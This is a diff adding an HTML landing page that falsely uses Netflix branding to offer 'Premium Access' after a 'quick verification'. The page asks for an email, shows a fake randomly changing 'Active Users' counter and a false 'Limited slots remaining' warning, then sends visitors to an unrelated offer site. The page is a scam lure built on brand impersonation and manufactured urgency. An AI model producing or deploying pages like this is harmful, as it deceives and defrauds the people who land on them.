@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Premium Access</title>
+
+<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,700,900" rel="stylesheet">
+
+<style>
+body{
+  margin:0;
+  font-family: 'Roboto', sans-serif;
+  background:#000;
+  color:#fff;
+  overflow:hidden;
+}
+
+/* Background */
+.main-bg{
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:url('https://images.unsplash.com/photo-1524985069026-dd778a71c7b4') center/cover no-repeat;
+  animation: zoomBg 20s infinite alternate ease-in-out;
+  z-index:-2;
+}
+@keyframes zoomBg{
+  0%{transform:scale(1);}
+  100%{transform:scale(1.2);}
+}
+
+.overlay{
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:linear-gradient(45deg, rgba(0,0,0,0.9), rgba(229,9,20,0.4));
+  z-index:-1;
+}
+
+/* Logo */
+.logo{
+  text-align:center;
+  font-size:55px;
+  font-weight:900;
+  color:#e50914;
+  margin-top:40px;
+}
+
+/* Box */
+.container{
+  max-width:420px;
+  margin:40px auto;
+  background:rgba(0,0,0,0.85);
+  padding:40px;
+  border-radius:12px;
+  text-align:center;
+}
+
+/* Text */
+h2{margin-bottom:10px;}
+p{color:#ccc;font-size:14px;}
+
+/* Input */
+input{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:5px;
+  margin-top:15px;
+}
+
+/* Button */
+button{
+  width:100%;
+  padding:15px;
+  margin-top:20px;
+  background:#e50914;
+  border:none;
+  color:#fff;
+  font-size:18px;
+  border-radius:5px;
+  cursor:pointer;
+}
+
+/* Status */
+.info{
+  margin-top:15px;
+  font-size:13px;
+}
+.highlight{
+  color:#e50914;
+  font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="main-bg"></div>
+<div class="overlay"></div>
+
+<div class="logo">NETFLIX</div>
+
+<div class="container">
+  <h2>Get Premium Access</h2>
+  <p>Complete a quick verification to unlock premium features</p>
+
+  <input type="email" id="email" placeholder="Enter your email">
+
+  <button onclick="goOffer()">Continue</button>
+
+  <div class="info">👥 Active Users: <span id="users">132</span></div>
+  <div class="info">⏳ Limited slots remaining</div>
+</div>
+
+<script>
+// users counter
+let users = 132;
+setInterval(()=>{
+  users += Math.random()>0.5 ? 1 : -1;
+  if(users<80) users=80;
+  document.getElementById("users").innerText = users;
+},1000);
+
+// redirect
+function goOffer(){
+  let email = document.getElementById("email").value;
+
+  if(email=="" || !email.includes("@")){
+    alert("Enter valid email");
+    return;
+  }
+
+  window.location.href="https://playabledownloads.com/1885258";}
+</script>
+
+</body>
+</html>
